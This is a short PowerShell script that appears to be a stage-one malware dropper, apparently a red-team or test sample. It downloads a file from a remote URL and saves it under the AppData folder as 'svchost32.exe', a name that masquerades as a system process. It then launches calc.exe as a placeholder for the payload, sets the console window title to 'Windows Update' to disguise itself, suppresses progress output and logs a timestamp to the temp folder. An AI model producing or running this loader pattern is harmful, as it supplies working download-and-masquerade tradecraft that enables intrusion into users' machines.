
[CmdletBinding()]
param(
    [string]$DownloadUrl = 'https://internal.corp/stage1.ps1',
    [string]$Stage2Path = "$env:APPDATA\svchost32.exe",
    [int]$ConnectionTimeout = 42
)
$ErrorActionPreference = "Stop"

function Get-Stage1Payload {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $ResultObject = Get-Stage1Payload -SourceUrl $DownloadUrl -DestinationPath $Stage2Path -TimeoutSec $ConnectionTimeout
    if ($ResultObject) {
        Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
$Host.UI.RawUI.WindowTitle = "Windows Update"
$ProgressPreference = "SilentlyContinue"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
